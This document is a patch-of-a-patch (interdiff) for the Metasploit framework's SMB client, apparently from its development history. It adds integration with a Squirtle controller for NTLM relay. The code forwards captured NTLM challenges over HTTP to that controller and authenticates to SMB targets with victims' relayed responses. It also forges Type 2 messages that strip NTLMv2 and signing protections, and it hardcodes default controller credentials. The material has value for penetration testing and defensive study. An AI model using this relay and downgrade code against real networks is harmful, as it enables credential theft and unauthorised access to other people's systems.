@@ -1,6 +1,6 @@
 Index: lib/msf/core/exploit/smb.rb
 ===================================================================
---- lib/msf/core/exploit/smb.rb	(revision 5721)
+--- lib/msf/core/exploit/smb.rb	(revision 5845)
 +++ lib/msf/core/exploit/smb.rb	(working copy)
 @@ -49,7 +49,11 @@
  			OptString.new('SMBUser', [ false, 'The username to authenticate as', '']),
@@ -8,10 +8,10 @@ Index: lib/msf/core/exploit/smb.rb
  			OptString.new('SMBDomain',  [ false, 'The Windows domain to use for authentication', 'WORKGROUP']),
 -			OptString.new('SMBName', [ true, 'The NetBIOS hostname (required for port 139 connections)', '*SMBSERVER'])
 +			OptString.new('SMBName', [ true, 'The NetBIOS hostname (required for port 139 connections)', '*SMBSERVER']),
-+			OptString.new('SQHost', [ false, 'Squirtle hostname', 'localhost']),
++			OptString.new('SQHost', [ false, 'Squirtle hostname', '127.0.0.1']),
 +			OptInt.new('SQPort', [ false, 'Squirtle listening port', 8080]),
 +			OptString.new('SQAuth', [ false, 'Username:Password to connect to Squirtle', 'squirtle:eltriuqs']),
-+			OptString.new('SQKey', [ false, 'Squirtle session key to use for authentication', '']),
++			OptString.new('SQKey', [ false, 'Squirtle session key to use for authentication', 'undef']),			
  		], Msf::Exploit::Remote::SMB)
  
  		register_options(
@@ -26,7 +26,7 @@ Index: lib/msf/core/exploit/smb.rb
 +			squirtledata['SQHost'] = datastore['SQHost']
 +			squirtledata['SQPort'] = datastore['SQPort']
 +			squirtledata['SQAuth'] = datastore['SQAuth']
-+		end
++		end	  
  		simple.login(
  			datastore['SMBName'], 
  			datastore['SMBUser'],
@@ -39,7 +39,7 @@ Index: lib/msf/core/exploit/smb.rb
  		simple.connect("\\\\#{datastore['RHOST']}\\IPC$")
 Index: lib/rex/proto/smb/client.rb
 ===================================================================
---- lib/rex/proto/smb/client.rb	(revision 5721)
+--- lib/rex/proto/smb/client.rb	(revision 5845)
 +++ lib/rex/proto/smb/client.rb	(working copy)
 @@ -10,6 +10,7 @@
  require 'rex/proto/smb/evasions'
@@ -49,32 +49,17 @@ Index: lib/rex/proto/smb/client.rb
  
  
  # Some short-hand class aliases
-@@ -117,6 +118,7 @@
+@@ -117,6 +118,9 @@
  	
  		# This will throw an exception if it fails to read the whole packet
  		data = self.smb_recv
++		
++		# store the data in an attribute we can read later
 +		self.pktdata = data
  
  		pkt = CONST::SMB_BASE_PKT.make_struct
  		pkt.from_s(data)
-@@ -488,7 +490,7 @@
- 				self.challenge_key = ack['Payload'].v['Payload'][0, ack['Payload'].v['KeyLength']]
- 			end
- 		end
--		
-+				
- 		# Set the session identifier
- 		if (ack['Payload'].v['SessionKey'] != nil)
- 			self.session_id = ack['Payload'].v['SessionKey']
-@@ -520,7 +522,6 @@
- 	
- 		if (self.dialect =~ /^(NT LANMAN 1.0|NT LM 0.12)$/)
- 		
--		
- 			if (self.challenge_key) 
- 				return self.session_setup_ntlmv1(*args)
- 			end
-@@ -534,7 +535,7 @@
+@@ -534,7 +538,7 @@
  	end
  
  	# Authenticate using clear-text passwords
@@ -83,115 +68,135 @@ Index: lib/rex/proto/smb/client.rb
  
  		data = [ pass, user, domain, self.native_os, self.native_lm ].collect{ |a| a + "\x00" }.join('');
  		
-@@ -571,8 +572,57 @@
+@@ -570,9 +574,61 @@
+ 		
  		return ack
  	end	
- 	
++
 +	# Squirtle agent communication
 +	def process_squirtle(sqdata = '')
-+		
-+		require 'json'
-+		
-+		if (not self.pktdata)
-+			puts "No Type2 message to process\n"
++  	
++		begin
++			require 'json'
++		rescue ::Exception => e
++			elog("JSON load error: #{e.to_s}")
 +			return
 +		end
-+
++  	
++		if (not self.pktdata)
++		puts "No Type2 message to process\n"
++		return
++		end
++  
 +		type2pkt = self.pktdata[self.pktdata.index("NTLMSSP")..self.pktdata.length]
-+
-+		puts "I'm Using Squirtle!"
-+		
++  
 +		type2msg =  Rex::Text.encode_base64(type2pkt)
 +		sqclient = Rex::Proto::Http::Client.new(sqdata['SQHost'], sqdata['SQPort'])
-+		puts "Type2: #{type2msg}"
-+
++		#puts "Type2: #{type2msg}"
++  
 +		begin
 +			req = sqclient.request_cgi(
-+				'method'			=> 'GET',
-+				'uri'					=> '/controller/type2',
++				'method'		=> 'GET',
++				'uri'			=> '/controller/type2',
 +				'vars_get'		=> { 'key' => sqdata['SQKey'], 'type2' => type2msg },
 +				'basic_auth'	=> sqdata['SQAuth']
-+			)
-+
-+			resp = sqclient.send_recv(req, 500)
-+			
-+			if (resp.code != 200)
-+				raise RuntimeError, "Squirtle responded with error: #{resp.code}"
-+			end
-+			
-+			puts "Squirtle returned: #{resp.body}"
-+			parsedresp = JSON.parse(resp.body)
-+			
-+			if (parsedresp['status'] == 'ok')
-+				(domain, user, host, lm, nt) = Rex::Proto::SMB::Utils.process_type3_message(parsedresp['result'])
-+			else
-+				raise XCEPT::SquirtleNoResult
-+				(domain, user, lm, nt) = '','','',''
-+			end
-+			
++		)
++  
++		resp = sqclient.send_recv(req, 500)
++  		
++		if (resp.code != 200)
++			raise RuntimeError, "Squirtle responded with error: #{resp.code}"
++		end
++  		
++		puts "Squirtle returned: #{resp.body}"
++		parsedresp = JSON.parse(resp.body)
++  		
++		if (parsedresp['status'] == 'ok')
++			(domain, user, host, lm, nt) = Rex::Proto::SMB::Utils.process_type3_message(parsedresp['result'])
++		else
++			raise XCEPT::SquirtleNoResult
++			(domain, user, lm, nt) = '','','',''
++		end
++  		
 +		ensure
 +			sqclient.close
 +		end
-+			
-+		return domain.to_s, user.to_s, lm.to_s, nt.to_s
++  		
++		return domain.to_s, user.to_s, lm.pack('H*'), nt.pack('H*')
 +	end
-+	
+ 	
  	# Authenticate using NTLMv1
 -	def session_setup_ntlmv1(user = '', pass = '', domain = '')
 +	def session_setup_ntlmv1(user = '', pass = '', domain = '', sqdata = '')
  	
  		raise XCEPT::NTLM1MissingChallenge if not self.challenge_key
  
-@@ -584,6 +634,11 @@
+@@ -584,6 +640,10 @@
  			hash_nt = pass.length > 0 ? CRYPT.ntlm_md4(pass, self.challenge_key)   : ''
  		end
  
-+		puts "session_setup_ntlmv1: sqkey = #{sqdata['SQKey']}"
-+		if (sqdata['SQKey'] != nil)
++		if (sqdata['SQKey'] != 'undef')
 +			(domain, user, hash_lm, hash_nt) = process_squirtle(sqdata)
 +		end
 +
  		data = ''
  		data << hash_lm
  		data << hash_nt
-@@ -675,12 +730,13 @@
+@@ -675,12 +735,12 @@
  	end
  	
  	# Authenticate using extended security negotiation (NTLMv2)
 -	def session_setup_ntlmv2(user = '', pass = '', domain = '', name = nil)
--	
 +	def session_setup_ntlmv2(user = '', pass = '', domain = '', name = nil, sqdata = '')
-+			
+ 	
  		if (name == nil)
  			name = Rex::Text.rand_text_alphanumeric(16)
  		end
 -		
 +
-+		puts "session_setup_ntlmv2: sqkey = #{sqdata['SQKey']}"
  		blob = UTILS.make_ntlmv2_secblob_init(domain, name)
  		
  		native_data = ''
-@@ -706,7 +762,6 @@
- 		self.smb_send(pkt.to_s)
- 		ack = self.smb_recv_parse(CONST::SMB_COM_SESSION_SETUP_ANDX, true)
+@@ -709,7 +769,7 @@
  		
--		
  		# The server doesn't know about NTLM_NEGOTIATE, try ntlmv1
  		if (ack['Payload']['SMB'].v['ErrorClass'] == 0x00020002)
- 			return session_setup_ntlmv1(user, pass, domain)
-@@ -759,6 +814,11 @@
+-			return session_setup_ntlmv1(user, pass, domain)
++			return session_setup_ntlmv1(user, pass, domain, sqdata)
+ 		end
+ 		
+ 		# Make sure the error code tells us to continue processing
+@@ -759,6 +819,11 @@
  		# Generate the fake LANMAN hash
  		resp_lmv2 = client_challenge + ("\x00" * 16)
  
 +		# Check to see if we should use Squirtle
-+		if (sqdata['SQKey'] != nil)
++		if (sqdata['SQKey'] != 'undef')
 +			(domain, user, resp_lmv2, resp_ntlm) = process_squirtle(sqdata)
 +		end
-+
++    
  		# Create the ntlmv2 security blob data
  		blob = UTILS.make_ntlmv2_secblob_auth(domain, name, user, resp_lmv2, resp_ntlm)
  		
-@@ -1662,13 +1722,13 @@
+@@ -779,13 +844,16 @@
+ 		pkt['Payload'].v['SessionKey'] = self.session_id
+ 		pkt['Payload'].v['Payload'] = blob + native_data 
+ 		
++		# for debugging, uncomment these two to get the Type3 client response
++		#sendpkt = pkt.to_s
++		#print_status("Type 3 = #{Rex::Text.encode_base64(sendpkt[sendpkt.index("NTLMSSP")..sendpkt.length])}")
+ 		self.smb_send(pkt.to_s)
+ 		ack = self.smb_recv_parse(CONST::SMB_COM_SESSION_SETUP_ANDX, true)
+ 		
+ 		# Make sure that authentication succeeded
+ 		if (ack['Payload']['SMB'].v['ErrorClass'] != 0)
+ 			if (user.length == 0)
+-				return self.session_setup_ntlmv1(user, pass, domain)
++				return self.session_setup_ntlmv1(user, pass, domain, sqdata)
+ 			end
+ 			
+ 			failure = XCEPT::ErrorCode.new
+@@ -1662,13 +1730,13 @@
  	attr_reader		:dialect, :session_id, :challenge_key, :peer_native_lm, :peer_native_os
  	attr_reader		:default_domain, :default_name, :auth_user, :auth_user_id
  	attr_reader		:multiplex_id, :last_tree_id, :last_file_id, :process_id, :last_search_id
@@ -209,8 +214,21 @@ Index: lib/rex/proto/smb/client.rb
  	
 Index: lib/rex/proto/smb/utils.rb
 ===================================================================
---- lib/rex/proto/smb/utils.rb	(revision 5721)
+--- lib/rex/proto/smb/utils.rb	(revision 5845)
 +++ lib/rex/proto/smb/utils.rb	(working copy)
+@@ -489,9 +489,9 @@
+ 			# Return the flags back to the decode so we can base64 it again
+ 			flags = reqflags.to_s(16)
+ 			0.upto(8) do |idx|
+-			  if (idx > flags.length)
+-			    flags.insert(0, "0")
+-			  end
++				if (idx > flags.length)
++					flags.insert(0, "0")
++				end
+ 			end
+ 
+ 			idx = 0
 @@ -507,6 +507,83 @@
  		end
  		return Rex::Text.encode_base64(decode).delete("\n") # base64 encode and remove the returns 
@@ -220,8 +238,8 @@ Index: lib/rex/proto/smb/utils.rb
 +	# Create a Base64 Type 2 Message from user-supplied data, not a Type 1 request
 +	#
 +	def self.create_type2_message(reqflags = "\x00\x00\x00\x00", nonce = "\x11\x22\x33\x44\x55\x66\x77\x88", win_domain = 'DOMAIN', 
-+					win_name = 'SERVER', dns_name = 'server', dns_domain = 'example.com', downgrade = true)
-+
++			win_name = 'SERVER', dns_name = 'server', dns_domain = 'example.com', downgrade = true)
++  
 +		dns_name = Rex::Text.to_unicode(dns_name + "." + dns_domain)
 +		win_domain = Rex::Text.to_unicode(win_domain)
 +		dns_domain = Rex::Text.to_unicode(dns_domain)
@@ -229,111 +247,112 @@ Index: lib/rex/proto/smb/utils.rb
 +		reqflags = Integer("0x" + reqflags.unpack("h8").to_s.reverse)
 +
 +		if (reqflags & CONST::REQUEST_TARGET) == CONST::REQUEST_TARGET
-+
-+				if (downgrade)
-+					# Remove NTLMv2 and Signing messages
-+					if (reqflags & CONST::NEGOTIATE_NTLM2_KEY) == CONST::NEGOTIATE_NTLM2_KEY
-+						reqflags = reqflags - CONST::NEGOTIATE_NTLM2_KEY
-+					end
-+					if (reqflags & CONST::NEGOTIATE_ALWAYS_SIGN) == CONST::NEGOTIATE_ALWAYS_SIGN
-+						reqflags = reqflags - CONST::NEGOTIATE_ALWAYS_SIGN
-+					end				
++  
++			if (downgrade)
++				# Remove NTLMv2 and Signing messages
++				if (reqflags & CONST::NEGOTIATE_NTLM2_KEY) == CONST::NEGOTIATE_NTLM2_KEY
++					reqflags = reqflags - CONST::NEGOTIATE_NTLM2_KEY
 +				end
++				if (reqflags & CONST::NEGOTIATE_ALWAYS_SIGN) == CONST::NEGOTIATE_ALWAYS_SIGN
++					reqflags = reqflags - CONST::NEGOTIATE_ALWAYS_SIGN
++				end				
++			end
++  
++			flags = reqflags + CONST::TARGET_TYPE_DOMAIN + CONST::TARGET_TYPE_SERVER				
++			tid = true
 +
-+				flags = reqflags + CONST::TARGET_TYPE_DOMAIN + CONST::TARGET_TYPE_SERVER				
-+				tid = true
-+
-+				tidoffset = 48 + win_domain.length
-+				tidbuff = 
-+					[2].pack('v') +				# tid type, win domain
-+					[win_domain.length].pack('v') +
-+					win_domain +
-+					[1].pack('v') +				# tid type, server name
-+					[win_name.length].pack('v') +
-+					win_name +
-+					[4].pack('v')	+			 # tid type, domain name
-+					[dns_domain.length].pack('v') +
-+					dns_domain +
-+					[3].pack('v')	+			# tid type, dns_name
-+					[dns_name.length].pack('v') +
-+					dns_name
-+		else
-+			flags = CONST::NEGOTIATE_UNICODE + CONST::NEGOTIATE_NTLM
-+			tid = false
-+		end
-+
-+		type2msg = "NTLMSSP\0" + # protocol, 8 bytes
-+			   "\x02\x00\x00\x00"		# type, 4 bytes
-+
-+		if (tid)
-+			type2msg +=	# Target security info, 8 bytes. Filled if REQUEST_TARGET
-+			[win_domain.length].pack('v') +	 # Length, 2 bytes
-+			[win_domain.length].pack('v')	 # Allocated space, 2 bytes
-+		end
-+
-+		type2msg +="\x30\x00\x00\x00" + #		Offset, 4 bytes
-+			 [flags].pack('V') +	# flags, 4 bytes
-+			 nonce +		# the nonce, 8 bytes
-+		 	 "\x00" * 8		# Context (all 0s), 8 bytes
-+
-+		if (tid)
-+			type2msg +=		# Target information security buffer. Filled if REQUEST_TARGET
-+				[tidbuff.length].pack('v') +	# Length, 2 bytes
-+				[tidbuff.length].pack('v') +	# Allocated space, 2 bytes
-+				[tidoffset].pack('V') +		# Offset, 4 bytes (usually \x48 + length of win_domain)
-+				win_domain +			# Target name data (domain in unicode if REQUEST_UNICODE)
-+								# Target information data
-+				tidbuff +			#	Type, 2 bytes
-+								#	Length, 2 bytes
-+								#	Data (in unicode if REQUEST_UNICODE)
-+				"\x00\x00\x00\x00"		# Terminator, 4 bytes, all \x00
-+		end
-+
-+		return Rex::Text.encode_base64(type2msg).delete("\n") # base64 encode and remove the returns
-+
++			tidoffset = 48 + win_domain.length
++			tidbuff = 
++				[2].pack('v') +				# tid type, win domain
++				[win_domain.length].pack('v') +
++				win_domain +
++				[1].pack('v') +				# tid type, server name
++				[win_name.length].pack('v') +
++				win_name +
++				[4].pack('v')	+			 # tid type, domain name
++				[dns_domain.length].pack('v') +
++				dns_domain +
++				[3].pack('v')	+			# tid type, dns_name
++				[dns_name.length].pack('v') +
++				dns_name
++	else
++		flags = CONST::NEGOTIATE_UNICODE + CONST::NEGOTIATE_NTLM
++		tid = false
 +	end
++  
++	type2msg = "NTLMSSP\0" + # protocol, 8 bytes
++	   "\x02\x00\x00\x00"		# type, 4 bytes
++  
++	if (tid)
++		type2msg +=	# Target security info, 8 bytes. Filled if REQUEST_TARGET
++		[win_domain.length].pack('v') +	 # Length, 2 bytes
++		[win_domain.length].pack('v')	 # Allocated space, 2 bytes
++	end
++  
++	type2msg +="\x30\x00\x00\x00" + #		Offset, 4 bytes
++		[flags].pack('V') +	# flags, 4 bytes
++		nonce +		# the nonce, 8 bytes
++  	 	"\x00" * 8		# Context (all 0s), 8 bytes
++  
++  	if (tid)
++  		type2msg +=		# Target information security buffer. Filled if REQUEST_TARGET
++  			[tidbuff.length].pack('v') +	# Length, 2 bytes
++  			[tidbuff.length].pack('v') +	# Allocated space, 2 bytes
++  			[tidoffset].pack('V') +		# Offset, 4 bytes (usually \x48 + length of win_domain)
++  			win_domain +	# Target name data (domain in unicode if REQUEST_UNICODE)
++  							# Target information data
++  			tidbuff +		#	Type, 2 bytes
++  							#	Length, 2 bytes
++  							#	Data (in unicode if REQUEST_UNICODE)
++  			"\x00\x00\x00\x00"		# Terminator, 4 bytes, all \x00
++  	end
++  
++  	return Rex::Text.encode_base64(type2msg).delete("\n") # base64 encode and remove the returns
++  
++  end
  	
  end
  end
 Index: lib/rex/proto/smb/exceptions.rb
 ===================================================================
---- lib/rex/proto/smb/exceptions.rb	(revision 5721)
+--- lib/rex/proto/smb/exceptions.rb	(revision 5845)
 +++ lib/rex/proto/smb/exceptions.rb	(working copy)
-@@ -839,9 +839,21 @@
+@@ -839,7 +839,19 @@
  	end
  end
  
 +class SquirtleNoResult < Error
-+	def to_s
-+		"Squirtle did not return a valid session."
-+	end
++  def to_s
++    "Squirtle did not return a valid session."
++  end
  end
 +
 +class SquirtleResult < SimpleClientError
-+	def to_s
-+		"Squirtle Result: " + self.source
-+	end
++  def to_s
++    "Squirtle Result: " + self.source
++  end
  end
 +
  end
++end
++end
  end
-+end
-+end
- 
- 
+\ No newline at end of file
 Index: lib/rex/proto/smb/simpleclient.rb
 ===================================================================
---- lib/rex/proto/smb/simpleclient.rb	(revision 5721)
+--- lib/rex/proto/smb/simpleclient.rb	(revision 5845)
 +++ lib/rex/proto/smb/simpleclient.rb	(working copy)
-@@ -179,7 +179,7 @@
+@@ -179,8 +179,8 @@
  		self.shares = { }
  	end
  	
 -	def login(name = '', user = '', pass = '', domain = '')
+-
 +	def login(name = '', user = '', pass = '', domain = '', sqdata = '')
- 
++    
  		begin
  			
+ 			if (self.direct != true)
 @@ -188,7 +188,7 @@
  			end
  		
@@ -343,3 +362,12 @@ Index: lib/rex/proto/smb/simpleclient.rb
  		rescue ::Exception
  			e = XCEPT::LoginError.new
  			e.source = $!.to_s
+@@ -268,6 +268,8 @@
+ 		client.trans_named_pipe(fid, data, no_response)
+ 	end
+ 	
++	
++	
+ end
+ end
+ end
